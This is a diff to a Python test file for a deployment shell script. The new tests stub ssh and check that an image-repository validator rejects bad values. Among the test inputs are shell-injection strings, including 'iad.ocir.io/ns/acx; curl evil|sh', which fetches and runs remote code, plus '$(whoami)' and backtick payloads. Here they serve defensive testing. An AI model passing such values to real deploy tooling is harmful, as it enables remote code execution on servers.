@@ -630,66 +630,316 @@ def test_d8_remote_build_refuses_case_evasion_runtime_vlm(tmp_path: pathlib.Path
     assert "refuse" in combined.lower() or "refuses" in combined.lower()
 
 
-def test_d4_boot_smoke_uses_real_entrypoint_and_cache_mount() -> None:
-    """D4: Gate 2 must run image CMD (not uvicorn override) with /data/cache mount."""
+def _assert_safe_image_repo_body() -> str:
     script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
-    # Tag promotion after smoke remains required.
-    deploy_body = script.split("do_deploy()", 1)[1].split("do_promote()", 1)[0]
+    m = re.search(
+        r"assert_safe_image_repo\(\)\s*\{(?P<body>.*?)\n\}",
+        script,
+        re.DOTALL,
+    )
+    assert m, "assert_safe_image_repo must exist"
+    return m.group("body")
+
+
+def _probe_image_repo(value: str) -> subprocess.CompletedProcess[str]:
+    """Execute the real assert_safe_image_repo body against a candidate repo path."""
+    body = _assert_safe_image_repo_body()
+    probe = textwrap.dedent(
+        f"""\
+        #!/usr/bin/env bash
+        set -euo pipefail
+        fail() {{ printf '%s\\n' "$*" >&2; exit 1; }}
+        assert_safe_image_repo() {{
+        {body}
+        }}
+        assert_safe_image_repo "ACX_IMAGE_REPO" {value!r}
+        echo ACCEPTED
+        """
+    )
+    return subprocess.run(
+        ["bash", "-c", probe],
+        check=False,
+        capture_output=True,
+        text=True,
+    )
+
+
+def test_assert_safe_image_repo_refuses_evil_and_accepts_ocir() -> None:
+    """S2-A-11 / TEST-15: assert_safe_image_repo is executable, not a spelling check.
+
+    Mutating the real function to ``return 0`` must turn this red (charset refuse
+    path is the only thing keeping evil OCIR paths out of ship_remote ssh strings).
+    """
+    evil = [
+        "iad.ocir.io/ns/acx; curl evil|sh",
+        "repo$(whoami)",
+        "repo`id`",
+        "repo|tee",
+        "repo&bg",
+        "repo with spaces",
+        "",
+    ]
+    for value in evil:
+        result = _probe_image_repo(value)
+        assert result.returncode != 0, (
+            f"assert_safe_image_repo must refuse {value!r}; "
+            f"stdout={result.stdout!r} stderr={result.stderr!r}"
+        )
+    ok = _probe_image_repo("iad.ocir.io/idu2kqqe2jxy/acx-backend")
+    assert ok.returncode == 0, ok.stderr
+    assert "ACCEPTED" in (ok.stdout or "")
+    ok_vlm = _probe_image_repo("iad.ocir.io/idu2kqqe2jxy/acx-backend-vlm")
+    assert ok_vlm.returncode == 0, ok_vlm.stderr
+
+
+def test_d4_boot_smoke_emits_real_entrypoint_and_cache_mount(
+    tmp_path: pathlib.Path,
+) -> None:
+    """D4 behavioural: do_boot_smoke Gate 2 uses real CMD + /data/cache:ro mounts.
+
+    Stubs ssh to capture the remote payload (including the SMOKE heredoc). Asserts
+    on the emitted command, not source spelling of do_boot_smoke.
+    """
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    ssh_log = tmp_path / "ssh.log"
+    ssh_log.write_text("")
+    # Log argv + drain stdin (heredoc body) into the same capture file.
+    (bindir / "ssh").write_text(
+        textwrap.dedent(
+            f"""\
+            #!/bin/sh
+            printf 'ARGV:%s\\n' "$*" >> "{ssh_log}"
+            if [ ! -t 0 ]; then
+              printf 'STDIN:' >> "{ssh_log}"
+              cat >> "{ssh_log}"
+              printf '\\n' >> "{ssh_log}"
+            fi
+            # Gate 1 import smoke must succeed so Gate 2 heredoc is sent.
+            exit 0
+            """
+        )
+    )
+    (bindir / "ssh").chmod(0o755)
+
+    env = os.environ.copy()
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    # Real function under test.
+    script = textwrap.dedent(
+        f"""\
+        source "{DEPLOY_SCRIPT}"
+        preflight_ssh() {{ :; }}
+        do_boot_smoke dev "iad.ocir.io/ns/acx-backend:deadbeef"
+        """
+    )
+    proc = subprocess.run(
+        ["bash", "-c", script],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=30,
+    )
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    captured = ssh_log.read_text()
+    # Gate 1: import probe with python entrypoint override (packaging only).
+    assert "import api.main" in captured
+    # Gate 2 heredoc: real image CMD (no sh/uvicorn entrypoint override).
+    assert "--entrypoint sh" not in captured
+    assert "uvicorn api.main:app" not in captured or "docker run" in captured
+    # Mount contract matching compose: blob root + optional models_path :ro.
+    assert "RECOGNITION_BLOB_ROOT=/var/lib/acx-blobs" in captured
+    assert "/data/cache:ro" in captured
+    assert "ACX_MODELS_PATH" in captured
+    # Deploy still promotes SHA before env tag after smoke (structural order).
+    deploy_script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    deploy_body = deploy_script.split("do_deploy()", 1)[1].split("do_promote()", 1)[0]
     assert deploy_body.index("do_push_sha") < deploy_body.index("promote_gate") < deploy_body.index(
         "do_push_tag"
     )
-    smoke = script.split("do_boot_smoke()", 1)[1].split("\ndo_restart()", 1)[0]
-    assert "--entrypoint sh" not in smoke or "uvicorn api.main:app" not in smoke
-    assert "/data/cache:ro" in smoke
-    assert "RECOGNITION_BLOB_ROOT" in smoke
-    assert "ACX_MODELS_PATH" in smoke
 
 
-def test_d6_ship_remote_uses_sudo_and_trailing_newline() -> None:
-    """D6: ship_remote_image_repo_env must sudo and guard trailing newline."""
-    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
-    m = re.search(
-        r"ship_remote_image_repo_env\(\)\s*\{(?P<body>.*?)\n\}",
-        script,
-        re.DOTALL,
+def test_d6_ship_remote_image_repo_env_emits_sudo_upsert(
+    tmp_path: pathlib.Path,
+) -> None:
+    """D6 behavioural: ship_remote_image_repo_env ssh payload uses sudo + trailing NL."""
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    ssh_log = tmp_path / "ssh.log"
+    ssh_log.write_text("")
+    (bindir / "ssh").write_text(
+        textwrap.dedent(
+            f"""\
+            #!/bin/sh
+            for a in "$@"; do last="$a"; done
+            printf '%s\\n' "$last" >> "{ssh_log}"
+            exit 0
+            """
+        )
     )
-    assert m, "ship_remote_image_repo_env missing"
-    body = m.group("body")
-    assert "sudo" in body
-    assert "tail -c1" in body or "trailing" in body.lower() or "tee -a" in body
-    # Ship before tag promotion (in promote_gate).
-    gate = script.split("promote_gate()", 1)[1].split("\nenv_to_compose_files", 1)[0]
-    assert "ship_remote_image_repo_env" in gate
-    assert gate.index("do_boot_smoke") < gate.index("ship_remote_image_repo_env")
+    (bindir / "ssh").chmod(0o755)
 
-
-def test_d9_clear_image_repo_subcommand_documented() -> None:
-    """D9: sticky ACX_IMAGE_REPO removal path exists and is documented."""
-    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
-    assert "clear-image-repo" in script
-    assert "clear_remote_image_repo_env" in script
-    assert "Sticky ACX_IMAGE_REPO" in script or "clear-image-repo" in script.split(
-        "Image variants", 1
-    )[1][:2000]
-
-
-def test_d10_verify_returns_not_exits_on_image_mismatch() -> None:
-    """D10: verify_running_image_matches_deployed must return 1, not fail/exit."""
-    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
-    m = re.search(
-        r"verify_running_image_matches_deployed\(\)\s*\{(?P<body>.*?)\n\}",
-        script,
-        re.DOTALL,
+    env = os.environ.copy()
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    safe_repo = "iad.ocir.io/idu2kqqe2jxy/acx-backend-vlm"
+    script = textwrap.dedent(
+        f"""\
+        source "{DEPLOY_SCRIPT}"
+        ACX_IMAGE_REPO={safe_repo!r}
+        ship_remote_image_repo_env "/opt/acx-backend/dev"
+        """
     )
-    assert m, "verify_running_image_matches_deployed missing"
-    body = m.group("body")
-    assert "return 1" in body
-    # fail() would defeat ACX_VERIFY_OPTIONAL when used under `if ! do_verify`.
-    assert not re.search(r"^\s*fail\s+", body, re.MULTILINE), (
-        "verify_running_image_matches_deployed must not call fail() (exits the shell)"
+    proc = subprocess.run(
+        ["bash", "-c", script],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
     )
-    assert "read_remote_image_repo" in script
-    assert "if ! verify_running_image_matches_deployed" in script
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    payload = ssh_log.read_text()
+    assert "sudo" in payload, payload
+    assert "tail -c1" in payload, payload
+    assert "tee -a" in payload or "ACX_IMAGE_REPO=" in payload, payload
+    assert safe_repo in payload, payload
+
+    # Charset gate is live on the ship path: evil repo must not reach ssh.
+    ssh_log.write_text("")
+    evil_script = textwrap.dedent(
+        f"""\
+        source "{DEPLOY_SCRIPT}"
+        ACX_IMAGE_REPO='iad.ocir.io/ns/acx; curl evil|sh'
+        ship_remote_image_repo_env "/opt/acx-backend/dev"
+        """
+    )
+    evil = subprocess.run(
+        ["bash", "-c", evil_script],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
+    )
+    assert evil.returncode != 0, "evil ACX_IMAGE_REPO must fail before ssh"
+    assert ssh_log.read_text() == "", f"ssh reached with: {ssh_log.read_text()!r}"
+
+
+def test_d9_clear_remote_image_repo_env_removes_key(
+    tmp_path: pathlib.Path,
+) -> None:
+    """D9 behavioural: clear_remote_image_repo_env runs sed delete over ssh."""
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    ssh_log = tmp_path / "ssh.log"
+    ssh_log.write_text("")
+    (bindir / "ssh").write_text(
+        textwrap.dedent(
+            f"""\
+            #!/bin/sh
+            for a in "$@"; do last="$a"; done
+            printf '%s\\n' "$last" >> "{ssh_log}"
+            echo 'removed ACX_IMAGE_REPO'
+            exit 0
+            """
+        )
+    )
+    (bindir / "ssh").chmod(0o755)
+
+    env = os.environ.copy()
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    script = textwrap.dedent(
+        f"""\
+        source "{DEPLOY_SCRIPT}"
+        preflight_ssh() {{ :; }}
+        clear_remote_image_repo_env dev
+        """
+    )
+    proc = subprocess.run(
+        ["bash", "-c", script],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
+    )
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    payload = ssh_log.read_text()
+    assert "ACX_IMAGE_REPO" in payload
+    assert "sed" in payload and ("/^ACX_IMAGE_REPO=/d" in payload or "ACX_IMAGE_REPO=" in payload)
+    # Subcommand dispatch exists (help / case arm).
+    help_proc = subprocess.run(
+        ["bash", str(DEPLOY_SCRIPT), "help"],
+        check=False,
+        capture_output=True,
+        text=True,
+        timeout=15,
+    )
+    assert help_proc.returncode == 0
+    combined = (help_proc.stdout or "") + (help_proc.stderr or "")
+    assert "clear-image-repo" in combined
+
+
+def test_d10_verify_image_mismatch_returns_not_exits(
+    tmp_path: pathlib.Path,
+) -> None:
+    """D10 behavioural: mismatch returns 1; shell stays alive for optional verify."""
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    # read_running_api_image / read_remote_image_repo both go through ssh.
+    # First ssh (read_remote): empty sticky repo; second (read_running): wrong image.
+    (bindir / "ssh").write_text(
+        textwrap.dedent(
+            """\
+            #!/bin/sh
+            # Heuristic: inspect/Config.Image probe vs .env grep.
+            for a in "$@"; do last="$a"; done
+            case "$last" in
+              *Config.Image*|*compose*ps*)
+                echo "iad.ocir.io/ns/acx-backend-vlm:latest"
+                ;;
+              *ACX_IMAGE_REPO*|*grep*)
+                # no sticky remote repo
+                ;;
+            esac
+            exit 0
+            """
+        )
+    )
+    (bindir / "ssh").chmod(0o755)
+
+    env = os.environ.copy()
+    env["PATH"] = f"{bindir}:{env['PATH']}"
+    # Local resolve expects recognition acx-backend; running image is -vlm → mismatch.
+    script = textwrap.dedent(
+        f"""\
+        source "{DEPLOY_SCRIPT}"
+        preflight_ssh() {{ :; }}
+        ACX_IMAGE_REPO="iad.ocir.io/ns/acx-backend"
+        if verify_running_image_matches_deployed dev; then
+          echo MATCH
+          exit 0
+        else
+          rc=$?
+          echo "MISMATCH_RC=$rc"
+          echo STILL_ALIVE
+          exit 0
+        fi
+        """
+    )
+    proc = subprocess.run(
+        ["bash", "-c", script],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
+    )
+    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    out = (proc.stdout or "") + (proc.stderr or "")
+    assert "STILL_ALIVE" in out, out
+    assert "MISMATCH_RC=1" in out, out
+    assert re.search(r"(?m)^MATCH$", out) is None, out
 
 
 if __name__ == "__main__":
